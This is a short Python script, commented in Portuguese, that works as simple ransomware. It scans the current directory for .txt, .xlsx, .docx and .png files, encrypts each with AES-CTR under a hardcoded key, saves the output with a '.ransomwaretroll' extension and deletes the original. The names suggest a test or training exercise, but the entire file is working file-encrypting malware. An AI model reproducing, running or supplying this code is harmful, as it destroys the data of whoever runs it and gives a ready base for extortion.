import os
import pyaes

def encrypt_file(file_name, key):
    """Criptografa um arquivo específico usando AES-CTR."""
    try:
        # 1. Abrir e ler o arquivo original
        with open(file_name, "rb") as file:
            file_data = file.read()

        # 2. Configurar a criptografia AES
        aes = pyaes.AESModeOfOperationCTR(key)
        encrypted_data = aes.encrypt(file_data)

        # 3. Criar o novo arquivo criptografado com uma extensão personalizada
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(encrypted_data)

        # 4. Remover o arquivo original
        os.remove(file_name)
        print(f"[+] Arquivo criptografado com sucesso: {file_name} -> {new_file_name}")

    except Exception as e:
        print(f"[-] Erro ao processar o arquivo {file_name}: {e}")

def main():
    # Chave de criptografia (deve ter exatamente 16, 24 ou 32 bytes para o AES)
    key = b"testeransomwares"
    
    # Extensões que você deseja alvejar/proteger
    target_extensions = (".txt", ".xlsx", ".docx", ".png")

    print("[*] Iniciando varredura de arquivos...")

    # Percorrer os arquivos no diretório atual
    for file_name in os.listdir():
        # Ignorar diretórios e o próprio script se estiver na mesma pasta
        if os.path.isdir(file_name) or file_name.endswith(".py"):
            continue

        # Verificar se o arquivo possui uma das extensões alvo e não está criptografado
        if file_name.endswith(target_extensions):
            encrypt_file(file_name, key)

    print("[*] Processo concluído!")

if __name__ == "__main__":
    main()
